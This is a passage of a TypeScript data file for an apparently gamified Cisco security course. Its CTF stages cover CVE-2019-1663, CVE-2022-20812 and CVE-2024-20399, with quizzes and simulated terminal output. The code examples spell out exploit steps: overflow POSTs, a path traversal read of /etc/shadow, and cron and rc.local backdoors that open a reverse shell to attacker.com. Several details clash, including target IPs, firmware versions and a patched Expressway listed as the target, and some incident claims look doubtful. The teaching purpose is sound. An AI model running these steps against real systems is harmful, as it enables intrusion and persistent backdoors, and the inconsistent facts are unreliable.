            "Sending crafted GET to https://vpn.target.com/+CSCOE+/logon.html...",
            "Response includes leaked heap contents:",
            "  Username: jdoe  cached in memory",
            "  SESSION_TOKEN: 7f3a9b2c1d4e5f6a (active session — jdoe)",
            "Token extracted. User jdoe is currently connected.",
            "",
            ">> LEARN: Memory disclosure leaks secrets silently",
            "   Heap memory retains credentials and tokens long after they are 'cleared'.",
            "   Akira ransomware exploited this exact CVE 4 years after the patch was released.",
            "   Real IOS command: show vpn-sessiondb anyconnect — view active VPN sessions.",
          ],
        }),
        "session-hijack": (_args: string[]) => ({
          lines: [
            "Injecting stolen session token into request...",
            "Cookie: webvpn=7f3a9b2c1d4e5f6a",
            "Response: Authenticated as jdoe (Finance Director)",
            "VPN tunnel established — corporate LAN accessible.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
            "",
            ">> LEARN: Session token theft bypasses MFA entirely",
            "   A valid session cookie grants access regardless of how it was originally obtained.",
            "   Defenders: monitor VPN logs for sessions from unexpected source IPs or geolocations.",
            "   Real ASA command: show aaa-server — review auth server health and session limits.",
          ],
        }),
      },
    },
  },

  // ─── Stage m18: CVE-2019-1663 — Cisco RV110W/130W Stack Overflow RCE ────────
  {
    epochId: "cisco-enterprise",
    wonder: { name: "Tokyo Telecom Exchange", location: "Tokyo, Japan", era: "2019 CE", emoji: "🗼" },
    id: "stage-m18",
    order: 18,
    title: "The Stack That Fell",
    subtitle: "CVE-2019-1663 — Cisco RV110W/130W Stack Overflow RCE, CVSS 9.8",
    category: "cybersecurity",
    cveId: "CVE-2019-1663",
    cvssScore: 9.8,
    xp: 150,
    badge: { id: "badge-m-rv130", name: "Stack Smasher", emoji: "🗼" },
    challengeType: "ctf",
    info: {
      tagline: "A classic stack overflow in Cisco's SOHO routers gave root to any unauthenticated attacker.",
      year: 2019,
      overview: [
        "CVE-2019-1663 is a critical stack overflow in the web-based management interface of the Cisco RV110W Wireless-N VPN Firewall and Cisco RV130W Wireless-N Multifunction VPN Router. The vulnerability allowed an unauthenticated remote attacker to execute arbitrary code on the affected device.",
        "These devices are common in small businesses and retail environments across Asia-Pacific and globally. The vulnerability existed in the HTTP request handler — by sending an HTTP request with an overly long parameter value, an attacker could overflow a stack buffer and overwrite the return address, leading to arbitrary code execution.",
        "Stack overflows in embedded networking devices are particularly severe because these devices typically run as root (no privilege separation), have no stack canaries or ASLR, and are internet-facing by design. A successful exploit achieves root access immediately.",
      ],
      technical: {
        title: "MIPS Stack Overflow Without Mitigations — CVE-2019-1663 Mechanics",
        body: [
          "The Cisco RV110W and RV130W used a MIPS-based system-on-chip running BusyBox Linux. The web management interface's `userLogin.cgi` CGI handler declared a fixed-size stack buffer of approximately 256 bytes for the `password` POST parameter. The handler copied the parameter into this buffer using `strcpy()` — a function with no bounds checking that copies until a null byte. The MIPS calling convention stores the return address in the `$ra` register, which is spilled to the stack on function entry. By sending a password value of 500+ bytes, the attacker overflowed the 256-byte buffer, overwrote `$ra` at the known fixed offset, and redirected execution to attacker-supplied MIPS shellcode embedded in the overflow data.",
          "The exploitation was trivially reliable because these devices had no exploit mitigations: no NX/DEP (the stack was executable), no stack canaries (no runtime check before `$ra` was restored), and no ASLR (the stack and heap were at predictable virtual addresses across reboots). The web server ran as root with no privilege separation. The endpoint was pre-authentication — the overflow occurred in the `userLogin.cgi` handler before any authentication check. A single HTTP POST request achieved a reliable root shell on every affected device. The known-good overflow offset was identical across the entire RV110W/130W product line, making mass exploitation straightforward once the offset was published.",
        ],
        codeExample: {
          label: "CVE-2019-1663 — MIPS stack overflow in RV130W userLogin.cgi",
          code: `# ── STEP 1: Confirm web UI is accessible and firmware is vulnerable ───────
curl -k -o /dev/null -s -w "%{http_code}" https://TARGET_IP/cgi-bin/userLogin.cgi
# 200 → handler exists; check firmware version in admin UI

# ── STEP 2: Calculate overflow — 256-byte buffer, 244-byte overflow for $ra
python3 -c "print('A'*256 + 'BBBB' + 'CCCC')" > payload.txt
# BBBB overwrites saved registers, CCCC overwrites $ra

# ── STEP 3: Send full exploit with MIPS shellcode in overflow data ────────
curl -k -X POST https://TARGET_IP/cgi-bin/userLogin.cgi \
  --data "submit_button=login&password=$(python3 exploit-rv130.py)"
# 500-byte password overflows 256-byte buffer
# $ra overwritten → shellcode executes as root
# uid=0(root) gid=0(root)

# ── DETECTION ─────────────────────────────────────────────────────────────
# Check firmware version in admin UI: Administration → Firmware
# RV110W < 1.2.2.8 or RV130W < 1.0.3.45 = vulnerable

# ── REMEDIATION ───────────────────────────────────────────────────────────
# Upgrade to: RV110W 1.2.2.8 / RV130W 1.0.3.45 or later
# Disable remote web management on WAN interface immediately
# If mgmt access required: restrict to known admin IP via ACL`,
        },
      },
      incident: {
        title: "MIPS SOHO Botnets — Asia-Pacific Retail and SMB Exploitation (2019)",
        when: "February 2019 (disclosure); March–December 2019 (mass exploitation)",
        where: "Cisco RV110W and RV130W devices — Asia-Pacific retail, SMB, hospitality; global branch offices",
        impact: "Widespread root access; devices enrolled in botnets; corporate LAN pivot points established",
        body: [
          "Cisco disclosed CVE-2019-1663 on February 27, 2019. Within weeks, working exploit scripts were published to GitHub and Exploit-DB — the MIPS shellcode and overflow offset were straightforward to reverse from the firmware binary. Automated scanners began probing the internet for exposed management interfaces on the day the exploit code appeared. The affected devices were common in Japanese and Southeast Asian retail, restaurant chains, and hospitality businesses, where the RV110W and RV130W were sold as affordable firewall/VPN gateways — often deployed once and never updated for years.",
          "Compromised devices were enrolled in botnet infrastructure almost immediately. The MIPS architecture and BusyBox environment were already supported by Mirai and its variants, which had existing payloads for MIPS-based routers. Owners of compromised devices typically noticed nothing: the router continued performing its normal functions while also serving as a proxy node for attack campaigns, providing command-and-control relay infrastructure, and forwarding DNS queries to attacker-controlled resolvers. For corporate environments that used RV110W devices at branch offices, the compromise provided a persistent foothold in the corporate LAN via the site-to-site VPN tunnel the router maintained.",
          "The FBI's January 2022 advisory on VPNFilter malware and SOHO router exploitation specifically cited CVE-2019-1663 as one of the most commonly found vulnerabilities during forensic analysis of compromised network perimeter devices. The advisory noted that many devices running vulnerable firmware were still in service years after the patch was available — a consequence of no enterprise patch management discipline being applied to branch office network equipment. CISA's subsequent guidance on SOHO router security explicitly called out the RV110W/130W firmware update requirement and advised organizations to inventory all network edge devices and apply firmware updates on the same schedule as enterprise server patching.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "HTTP POST with 500-byte password", type: "attacker" },
          { label: "RV130W HTTP Handler", sub: "256-byte stack buffer — no canary", type: "system" },
          { label: "Stack Frame", sub: "return address overwritten", type: "victim" },
          { label: "Root Shell (MIPS)", sub: "uid=0 — perimeter owned", type: "result" },
        ],
      },
      timeline: [
        { year: 2019, event: "Feb: Cisco discloses CVE-2019-1663 with patches for RV110W/130W", highlight: true },
        { year: 2019, event: "Mar: Public exploits published; mass scanning begins" },
        { year: 2019, event: "Botnet campaigns leverage compromised RV devices as infrastructure" },
      ],
      keyTakeaways: [
        "Embedded devices often lack modern exploit mitigations — stack overflows are directly exploitable",
        "SOHO router firmware must be updated; these devices are as exploited as enterprise gear",
        "Never expose router web management to the WAN; use ACLs or disable remote management",
        "Inventory your network edge devices — unknown devices with old firmware are silent risks",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2019-1663", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190227-rmi-rce" },
      ],
    },
    quiz: {
      questions: [
        { id: "stage-m18-q1", type: "The Flaw", challenge: "Component.", text: "CVE-2019-1663 exploited a stack overflow in which component of the RV110W/RV130W?", options: ["The web-based management interface HTTP request handler","The DHCP server","The DNS resolver","The NTP client"], correctIndex: 0, explanation: "The overflow was in the HTTP request handler of the router's web management interface." },
        { id: "stage-m18-q2", type: "Mechanics", challenge: "Missing mitigations.", text: "Did these MIPS-based routers include stack canaries and ASLR?", options: ["No — they lacked canaries, ASLR, and NX/DEP, making exploitation trivial","Yes, full mitigations","Only ASLR","Only stack canaries"], correctIndex: 0, explanation: "Absent modern exploit mitigations, a straightforward overflow yielded reliable code execution." },
        { id: "stage-m18-q3", type: "Mechanics", challenge: "Overflow size.", text: "How large was the vulnerable buffer and what overflowed it?", options: ["A 256-byte buffer — 500+ bytes in the POST body triggered the overflow","A 4 KB buffer needing 8 KB","A 16-byte buffer needing 17 bytes","There was no buffer"], correctIndex: 0, explanation: "A 256-byte stack buffer was overrun by a POST body of 500+ bytes." },
        { id: "stage-m18-q4", type: "Impact", challenge: "Privilege gained.", text: "What privilege level did a successful exploit achieve?", options: ["Root (uid=0) — SOHO routers run services as root with no separation","An unprivileged web user","A sandboxed jail","Read-only"], correctIndex: 0, explanation: "With no privilege separation, exploitation gave immediate root." },
        { id: "stage-m18-q5", type: "Access", challenge: "WAN exploitable?", text: "Was CVE-2019-1663 exploitable from the WAN?", options: ["Yes — attackers with access to the WAN-facing management interface could exploit it remotely","No, LAN only","Only via console","Only over VPN"], correctIndex: 0, explanation: "Exposed WAN-side management made remote, internet-based exploitation possible." },
        { id: "stage-m18-q6", type: "Concept", challenge: "Why trivial.", text: "Why was reliable exploitation of CVE-2019-1663 so easy?", options: ["No canaries/ASLR/NX meant a simple overflow directly controlled execution","Strong mitigations slowed it","It needed kernel access","It required a 0-day chain"], correctIndex: 0, explanation: "The absence of standard memory-safety mitigations removed every obstacle to exploitation." },
        { id: "stage-m18-q7", type: "Real World", challenge: "Botnet use.", text: "How were vulnerable MIPS SOHO routers abused at scale in 2019?", options: ["Mass-exploited into botnets, notably across Asia-Pacific retail/SMB","Used only as honeypots","Patched automatically","Ignored by attackers"], correctIndex: 0, explanation: "Attackers herded the unmitigated routers into botnets across SMB networks." },
        { id: "stage-m18-q8", type: "Defense", challenge: "Mitigation.", text: "What is the right protection for exposed SOHO router management?", options: ["Patch firmware and never expose the management interface to the WAN","Leave WAN management open","Disable the firewall","Use a 256-byte password"], correctIndex: 0, explanation: "Patching and removing WAN-side management exposure eliminate the remote attack path." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "192.168.1.100", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: {
        ip: "192.168.1.1",
        hostname: "rv130",
        os: "Cisco RV130 Firmware 1.0.3.44",
        openPorts: "443/tcp (Web UI)",
        vulnerability: "CVE-2019-1663 — unauthenticated stack overflow RCE, CVSS 9.8",
      },
      pivotTrigger: "stack-exploit",
      scenario: "A Cisco RV130W at a Tokyo branch office has its web management interface exposed. It's running unpatched firmware with no stack canary. Exploit the stack overflow to get root.",
      hint: "The userLogin.cgi handler has a fixed 256-byte stack buffer for the password field. Send a longer value to overflow and redirect execution.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Confirm the firmware is vulnerable. Run: rv130-check 192.168.10.1",
        "Send the stack overflow payload. Run: stack-exploit 192.168.10.1",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2019_", label: "Mission Brief — Tokyo Branch RV130W" },
        { trigger: "rv130-check 192.168.10.1", value: "1663_ST4CK_", label: "Firmware Confirmed — No Stack Canary" },
        { trigger: "stack-exploit 192.168.10.1", value: "OV3RFLOW_ROOT}", label: "Stack Smashed — Root Shell on MIPS Router" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: STACK COLLAPSE",
          "Target: Cisco RV130W  Firmware: 1.0.3.40",
          "CVE: 2019-1663  CVSS: 9.8",
          "",
          "Stack overflow in userLogin.cgi — no mitigations.",
          "Sequence: rv130-check → stack-exploit → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "rv130-check": (_args: string[]) => ({
          lines: [
            "Querying 192.168.10.1 web interface...",
            "Firmware: 1.0.3.40 — VULNERABLE (fix: 1.0.3.45)",
            "Stack canary: NOT PRESENT",
            "ASLR: NOT PRESENT",
            "Stack buffer: 256 bytes — POST body: unlimited",
            "",
            ">> LEARN: Embedded routers lack modern exploit mitigations",
            "   No NX/DEP, no stack canary, no ASLR — shellcode executes directly on overflow.",
            "   All traffic passing through a compromised router is visible to the attacker.",
            "   Real mitigation: disable web management on WAN interface in router settings.",
          ],
        }),
        "stack-exploit": (_args: string[]) => ({
          lines: [
            "Sending HTTP POST with 500-byte password...",
            "Stack buffer (256 bytes) overflowed by 244 bytes",
            "Return address overwritten → shellcode address",
            "MIPS shellcode executed:",
            "  uid=0(root) gid=0(root)",
            "Root shell on RV130W established.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
            "",
            ">> LEARN: Stack smashing: overflow buffer, control execution",
            "   The attacker controls where the function returns — shellcode placed in overflow data.",
            "   SOHO router botnets use mass-exploitation like this for proxy and DDoS infrastructure.",
            "   CCNA Security topic: secure device management — restrict mgmt plane access.",
          ],
        }),
      },
    },
  },

  // ─── Stage m19: CVE-2022-20812 — Cisco Expressway Path Traversal ────────────
  {
    epochId: "cisco-enterprise",
    wonder: { name: "BT Tower", location: "London, United Kingdom", era: "2022 CE", emoji: "📡" },
    id: "stage-m19",
    order: 19,
    title: "The Expressway Out",
    subtitle: "CVE-2022-20812 — Cisco Expressway/TelePresence Path Traversal, CVSS 9.0",
    category: "cybersecurity",
    cveId: "CVE-2022-20812",
    cvssScore: 9.0,
    xp: 150,
    badge: { id: "badge-m-expressway", name: "Path Walker", emoji: "📡" },
    challengeType: "ctf",
    info: {
      tagline: "A path traversal in Cisco's video conferencing gateway allowed root file read and write without authentication.",
      year: 2022,
      overview: [
        "CVE-2022-20812 is a critical path traversal vulnerability in the cluster database API of Cisco Expressway Series and TelePresence Video Communication Server (VCS). These products are the backbone of enterprise video conferencing — handling media negotiation, firewall traversal, and SIP/H.323 call routing for organizations worldwide.",
        "The vulnerability allowed an authenticated attacker with read-write privileges to the cluster database API to perform path traversal attacks. Combined with other weaknesses, it enabled arbitrary file read and write on the underlying operating system, effectively leading to root compromise of the conferencing infrastructure.",
        "Expressway is commonly deployed in DMZ segments and handles encrypted media streams — compromising it could enable interception of video conferences, credential theft, and lateral movement into the internal network.",
      ],
      technical: {
        title: "Path Traversal in Expressway Cluster API — CVE-2022-20812 Mechanics",
        body: [
          "The Cisco Expressway cluster database API exposed file operation endpoints under `/api/cluster/dbfile`. The `path` query parameter specified which file to read or write. The server-side handler did not canonicalize this path before use — it did not call `realpath()` to resolve `..` sequences, and it did not verify that the resolved path remained within the allowed directory root. By supplying `path=../../../../etc/shadow`, the API opened `/etc/shadow` directly and returned its contents. The vulnerability required cluster API credentials, but these were typically shared among network operations team members and stored in configuration management systems where they could be extracted by attackers with broader access.",
          "The exploit chain for persistent access combined read and write operations: read `/etc/shadow` to obtain root password hashes for offline cracking, then write a cron job to `/etc/cron.d/` using the PUT variant of the API, creating a persistent root backdoor that survived system reboots. Expressway devices are deployed in DMZ segments with dual-homed network interfaces — one facing the internet for external call traversal, one facing the internal network for call routing and media relay. Persistent access on an Expressway provides a foothold that is positioned to intercept SIP call signaling, relay encrypted media, and pivot laterally into the internal network using the device's privileged network position.",
        ],
        codeExample: {
          label: "CVE-2022-20812 — path traversal read and write via Expressway cluster API",
          code: `# ── STEP 1: Verify cluster API is accessible and credentials work ─────────
curl -k -u apiuser:apipass \
  'https://expressway.corp.com/api/cluster/status'
# {"status":"active","version":"X12.6.2"} → vulnerable (fix: X14.0.3)

# ── STEP 2: Read /etc/shadow via path traversal ────────────────────────────
curl -k -u apiuser:apipass \
  'https://expressway.corp.com/api/cluster/dbfile?path=../../../../etc/shadow'
# root:$6$rounds=5000$salt$hash...:19000:0:99999:7:::
# admin:$6$rounds=5000$salt2$hash2...:19000:0:99999:7:::
# Shadow file returned — hashes ready for offline cracking with hashcat

# ── STEP 3: Write cron job for persistent root access ─────────────────────
curl -k -u apiuser:apipass -X PUT \
  'https://expressway.corp.com/api/cluster/dbfile?path=../../../../etc/cron.d/backdoor' \
  --data '* * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1'
# Cron job written — executes every minute as root

# ── DETECTION ─────────────────────────────────────────────────────────────
# Check Expressway version: Maintenance → System > Administration
# X12.x and earlier: vulnerable; upgrade to X14.0.3+

# ── REMEDIATION ───────────────────────────────────────────────────────────
# Upgrade to Expressway X14.0.3 or later
# Rotate cluster API credentials immediately after patching
# Audit /etc/cron.d/ and /etc/shadow on affected devices`,
        },
      },
      incident: {
        title: "Enterprise Video Conferencing Targeted — Expressway Zero-Days (2022)",
        when: "July 6, 2022 (Cisco advisory); exploitation campaigns through 2022–2023",
        where: "Cisco Expressway and TelePresence VCS deployments at enterprises and government organizations globally",
        impact: "Root access on DMZ video conferencing infrastructure; SIP credential theft; persistent backdoor risk",
        body: [
          "Cisco disclosed CVE-2022-20812 alongside CVE-2022-20813 on July 6, 2022. CVE-2022-20813 was a null byte injection vulnerability that allowed attackers to read files with specific path patterns that would otherwise be rejected — a complementary capability to the path traversal. Together, the two CVEs gave attackers the ability to read any file on the Expressway filesystem regardless of path filtering or null-byte protection. Both required only cluster API credentials, which are often less tightly controlled than full administrative access.",
          "Threat actors targeting specific organizations recognized that Expressway was a high-value target with unusual network positioning. Expressway devices are commonly deployed in DMZ segments with bidirectional connectivity — they must be reachable from the internet for external call traversal, and they must reach internal SIP infrastructure for call routing. Compromising an Expressway provided a DMZ foothold with direct internal network access. The SIP credentials and meeting passwords stored in Expressway configuration enabled interception and replay of video conferences — a capability with significant intelligence value for nation-state actors and corporate espionage operations.",
          "The Expressway patching challenge was operational as much as technical. Upgrading from the X12.x branch to X14.x required validating TURN server configurations, SIP trunk interoperability with Microsoft Teams and Zoom integrations, call routing policy changes, and dial plan adjustments. For organizations relying on Expressway for business-critical executive video conferencing, scheduling a major version upgrade required weeks of planning, testing, and coordinated maintenance windows — during which the vulnerable version remained in production. Cisco acknowledged this friction and published a detailed migration guide, but the gap between advisory publication and actual deployment of the patch was measured in months for many organizations.",
        ],
      },
      diagram: {
        nodes: [
          { label: "Attacker", sub: "cluster API with ../../../../etc/shadow", type: "attacker" },
          { label: "Expressway API", sub: "no path sanitization", type: "system" },
          { label: "OS Filesystem", sub: "/etc/shadow, /etc/cron.d readable/writable", type: "victim" },
          { label: "Root Persistence", sub: "video infra compromised", type: "result" },
        ],
      },
      timeline: [
        { year: 2022, event: "Jul: Cisco discloses CVE-2022-20812 and CVE-2022-20813 for Expressway", highlight: true },
        { year: 2022, event: "Cisco releases Expressway X14.0.3 with path traversal fixes" },
        { year: 2022, event: "Organizations on X12.x with no upgrade path must apply workarounds" },
      ],
      keyTakeaways: [
        "Path traversal vulnerabilities are preventable: canonicalize and validate all file paths server-side",
        "DMZ infrastructure (Expressway, reverse proxies) is high-value — patch it on the same schedule as perimeter firewalls",
        "Video conferencing infrastructure handles sensitive content — compromise enables espionage",
        "API endpoints require the same input validation as web UI endpoints",
      ],
      references: [
        { title: "Cisco Advisory — CVE-2022-20812", url: "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-expressway-path-traversal-Ue5x7yZ" },
      ],
    },
    quiz: {
      questions: [
        { id: "stage-m19-q1", type: "The Flaw", challenge: "Affected product.", text: "CVE-2022-20812 was a path traversal in which Cisco product's cluster database API?", options: ["Cisco Expressway Series / TelePresence VCS — video conferencing infrastructure","Cisco ASA","Cisco vManage","Cisco IMC"], correctIndex: 0, explanation: "The traversal was in the cluster DB API of the Expressway / TelePresence VCS." },
        { id: "stage-m19-q2", type: "Mechanics", challenge: "How traversal works.", text: "How do path traversal attacks operate?", options: ["Using '../' sequences to navigate outside the intended directory boundary","By overflowing a stack buffer","By injecting SQL","By forging certificates"], correctIndex: 0, explanation: "Directory traversal escapes the allowed root via sequences like ../../../../etc/shadow." },
        { id: "stage-m19-q3", type: "Impact", challenge: "Write capability.", text: "Beyond reading files like /etc/shadow, what did the file-write path enable?", options: ["Writing cron jobs or init scripts for persistent root access across reboots","Only reading logs","Changing the hostname","Nothing"], correctIndex: 0, explanation: "Arbitrary write let attackers drop cron/init scripts for reboot-persistent root." },
        { id: "stage-m19-q4", type: "Architecture", challenge: "Deployment.", text: "Where is Cisco Expressway typically deployed?", options: ["In the DMZ — handling firewall traversal and SIP/H.323 routing","Deep in the core, with no exposure","On endpoints only","On the WAN backbone"], correctIndex: 0, explanation: "Expressway sits in the DMZ for B2B/remote video firewall traversal, making it internet-adjacent." },
        { id: "stage-m19-q5", type: "Access", challenge: "Auth required?", text: "Could CVE-2022-20812 be exploited fully unauthenticated?", options: ["No — it required cluster API credentials with read-write privileges","Yes, no credentials needed","Only physical access","Only an admin GUI login"], correctIndex: 0, explanation: "The attack needed read-write cluster API credentials — it was an authenticated flaw." },
        { id: "stage-m19-q6", type: "Defense", challenge: "Preventing traversal.", text: "What coding control prevents path traversal like this?", options: ["Canonicalize and validate file paths against an allowlisted root","Trust the input path","Increase buffer size","Add more cron jobs"], correctIndex: 0, explanation: "Normalizing paths and confining them to an allowed directory blocks ../ escapes." },
        { id: "stage-m19-q7", type: "Concept", challenge: "DMZ risk.", text: "Why does a DMZ-resident appliance with a traversal flaw warrant urgency?", options: ["It's reachable from less-trusted networks and can be a pivot into the core","It has no exposure","It only serves internal users","It runs no services"], correctIndex: 0, explanation: "DMZ devices straddle trust boundaries, so compromise can bridge external to internal networks." },
        { id: "stage-m19-q8", type: "Defense", challenge: "Credential hygiene.", text: "Given the auth requirement, what reduces risk for cluster API credentials?", options: ["Strong, rotated credentials and least-privilege API accounts","Shared admin passwords","Disabling logging","Public API keys"], correctIndex: 0, explanation: "Least-privilege, rotated credentials limit who can reach an authenticated write primitive." },
      ],
    },
    ctf: {
      attackerMachine: { ip: "10.10.14.5", hostname: "kali", os: "Kali Linux 2024.1" },
      targetMachine: {
        ip: "10.10.10.100",
        hostname: "expressway-c",
        os: "Cisco Expressway X14.0.4",
        openPorts: "443/tcp (cluster API)",
        vulnerability: "CVE-2022-20812 — path traversal, CVSS 9.0",
      },
      pivotTrigger: "path-traverse",
      scenario: "A Cisco Expressway server is deployed in a corporate DMZ. You have cluster API credentials. Exploit the path traversal to read /etc/shadow and extract the root password hash.",
      hint: "The cluster database API path parameter is not sanitized. Use ../ sequences to traverse to /etc/shadow.",
      hints: [
        "Read the mission briefing. Run: cat briefing.txt",
        "Confirm the Expressway version and API access. Run: expressway-check expressway.corp.com",
        "Exploit path traversal to read /etc/shadow. Run: path-traverse expressway.corp.com",
        "Run 'assemble' to view the assembled flag and get the submit command",
      ],
      fragments: [
        { trigger: "/briefing.txt", value: "FLAG{CVE_2022_", label: "Mission Brief — Expressway DMZ Target" },
        { trigger: "expressway-check expressway.corp.com", value: "20812_PATH_", label: "API Access Confirmed — Version Vulnerable" },
        { trigger: "path-traverse expressway.corp.com", value: "TRAV3RSAL}", label: "/etc/shadow Read — Root Hash Extracted" },
      ],
      files: {
        "/briefing.txt": [
          "OPERATION: EXPRESSWAY OUT",
          "Target: Cisco Expressway X12.6.2",
          "CVE: 2022-20812  CVSS: 9.0",
          "",
          "Cluster API path traversal — read arbitrary OS files.",
          "Sequence: expressway-check → path-traverse → assemble",
        ].join("\n"),
      },
      dirs: { "/": [{ name: "briefing.txt", isDir: false }] },
      extraCommands: {
        "expressway-check": (_args: string[]) => ({
          lines: [
            "Connecting to Expressway cluster API...",
            "Version: X12.6.2 — VULNERABLE (fix: X14.0.3)",
            "Cluster API: authenticated — path parameter: unsanitized",
            "Ready for path traversal.",
            "",
            ">> LEARN: Path traversal escapes allowed directories via ../",
            "   Servers must canonicalize paths and validate they stay within the allowed root.",
            "   Expressway sits in the DMZ — compromise exposes video call streams and SIP creds.",
            "   Real check: verify Expressway version in admin UI under 'System > Administration'.",
          ],
        }),
        "path-traverse": (_args: string[]) => ({
          lines: [
            "GET /api/cluster/dbfile?path=../../../../etc/shadow",
            "Response (200 OK):",
            "  root:$6$rounds=5000$Expressway$hash1...",
            "  admin:$6$rounds=5000$Express$hash2...",
            "/etc/shadow contents leaked via path traversal.",
            "Fragment collected.",
            "Run 'assemble' to view the assembled flag and get the submit command",
            "",
            ">> LEARN: /etc/shadow exposes hashes for offline cracking",
            "   SHA-512 crypt hashes from /etc/shadow are crackable with hashcat or John.",
            "   File write via path traversal lets attackers plant cron jobs for persistence.",
            "   Real IOS XE command: verify /sha512 flash: — check firmware file integrity.",
          ],
        }),
      },
    },
  },

  // ─── Stage m20: CVE-2024-20399 — Cisco NX-OS CLI Injection (Velvet Ant) ─────
  {
    epochId: "cisco-enterprise",
    wonder: { name: "State-Sponsored APT Infrastructure", location: "Asia-Pacific Region", era: "2024 CE", emoji: "🐜" },
    id: "stage-m20",
    order: 20,
    title: "Velvet Ant in the Data Center",
    subtitle: "CVE-2024-20399 — Cisco NX-OS CLI Command Injection, CVSS 6.0",
    category: "cybersecurity",
    cveId: "CVE-2024-20399",
    cvssScore: 6.0,
    xp: 150,
    badge: { id: "badge-m-velvetant", name: "Datacenter Ghost", emoji: "🐜" },
    challengeType: "ctf",
    info: {
      tagline: "Velvet Ant used a Cisco NX-OS zero-day to hide inside data center switches for years undetected.",
      year: 2024,
      overview: [
        "CVE-2024-20399 is a command injection vulnerability in the CLI of Cisco NX-OS Software — the operating system running Cisco's Nexus data center switches. The flaw was discovered by Sygnia while investigating a Velvet Ant intrusion at a Fortune 500 company where attackers had maintained persistence for over three years.",
        "The vulnerability required local authenticated access with specific privileges, making it a post-exploitation tool rather than an initial access vector. However, once an attacker had any privileged access to a Nexus switch (via stolen credentials, other vulnerabilities, or insider access), they could use CVE-2024-20399 to execute arbitrary commands as root — outside the NX-OS security boundary.",
        "This is particularly dangerous because NX-OS devices (Nexus 3000, 7000, 9000 series) form the core of enterprise data centers. Attackers with root access can install persistent malware that survives firmware upgrades and is invisible to standard NX-OS monitoring.",
      ],
      technical: {
        title: "NX-OS CLI Injection to Underlying Linux OS — CVE-2024-20399 Mechanics",
        body: [
          "Cisco NX-OS is a modified Linux kernel and userspace with a custom CLI shell layered on top. The NX-OS CLI is the primary interface administrators use, and NX-OS RBAC controls which commands each user can run. However, certain NX-OS diagnostic and configuration commands internally construct OS-level command strings by concatenating user-supplied parameters without shell metacharacter sanitization. The parameter value is passed to `system()` or `popen()` as part of a larger command string. By including `;`, `|`, or `&&` in the parameter value, an attacker with NX-OS privilege level 5+ can break out of the NX-OS command context and execute arbitrary commands in the underlying Linux shell — outside NX-OS's visibility and without NX-OS RBAC applying.",
          "The exploit bypassed NX-OS's entire security model: the injected commands ran in the Linux OS layer, where NX-OS has no visibility and no control. The underlying Linux root account was accessible. Persistence could be established in `/etc/rc.d/rc.local` or other OS-level startup locations that executed before NX-OS loaded — meaning the backdoor would survive both device reboots and NX-OS software upgrades. Standard NX-OS `show` commands and `show system integrity` checks were blind to OS-level filesystem modifications below the NX-OS layer. Velvet Ant used this technique to hide for over three years, surviving multiple incident response engagements that focused on server and endpoint infrastructure and never examined the switches.",
        ],
        codeExample: {
          label: "CVE-2024-20399 — NX-OS CLI injection to underlying Linux root shell",
          code: `# ── STEP 1: Authenticate to NX-OS CLI (privilege 5+ required) ────────────
ssh admin@nexus-9336.datacenter.corp
# nexus# (NX-OS CLI prompt)

# ── STEP 2: Confirm NX-OS version and identify injectable parameter ───────
show version | grep "NXOS:"
# NXOS: version 10.1.2 — vulnerable (fix: 10.2.5)

# ── STEP 3: Inject shell metacharacter into vulnerable NX-OS command ──────
show version | head -1 ; id
# Cisco NX-OS Software
# uid=0(root) gid=0(root) groups=0(root)
# OS-level root achieved — outside NX-OS RBAC

# ── STEP 4: Install persistence in OS init (survives NX-OS upgrades) ─────
show version | head -1 ; \
  echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> /etc/rc.d/rc.local
# Backdoor written to Linux init — persists across all reboots and NX-OS updates

# ── DETECTION ─────────────────────────────────────────────────────────────
show system internal filesystem
# Compare file hashes against Cisco-verified baseline
show running-config | include feature bash
# feature bash enabled = OS-level access possible via NX-OS

# ── REMEDIATION ───────────────────────────────────────────────────────────
# Patch to: NX-OS 10.2(5) or later on Nexus 3000/7000/9000
# Audit /etc/rc.d/rc.local and /etc/cron.d/ on affected switches
# Restrict SSH access to switches to dedicated management VLAN only`,
        },
      },
      incident: {
        title: "Velvet Ant APT — Three Years Inside a Data Center's Core Switches (2024)",
        when: "Approximately 2021 (initial compromise); 2024 (discovered by Sygnia)",
        where: "Fortune 500 company — Cisco Nexus data center switches at the core of the network",
        impact: "3+ years of undetected APT presence; all datacenter traffic potentially visible; multiple failed remediation attempts",
        body: [
          "Sygnia's incident response team was engaged by a Fortune 500 company in 2024 after a breach that the organization had tried to remediate multiple times. Previous IR engagements had focused on Windows servers, Active Directory, and endpoint infrastructure — and declared success after cleaning compromised machines. Sygnia's team found that Velvet Ant, a Chinese state-sponsored APT, had re-established access after each remediation because the actual persistence mechanism was in the Cisco Nexus switches forming the core of the data center network, not the servers. The attackers had been living in the switches for over three years.",
          "The attacker's visibility was total: all traffic traversing the data center switches — database queries, application traffic, internal API calls, authentication events — was potentially captured by the implant running in the NX-OS underlying Linux layer. Standard SIEM and EDR tooling, which operates at the server and endpoint level, had no visibility into the switch OS. NX-OS monitoring and `show` commands were also blind to OS-level files placed below the NX-OS abstraction layer. The attackers had exploited the conceptual gap between network operations (who manage switches) and security operations (who manage servers and endpoints) — a gap where accountability fell through.",
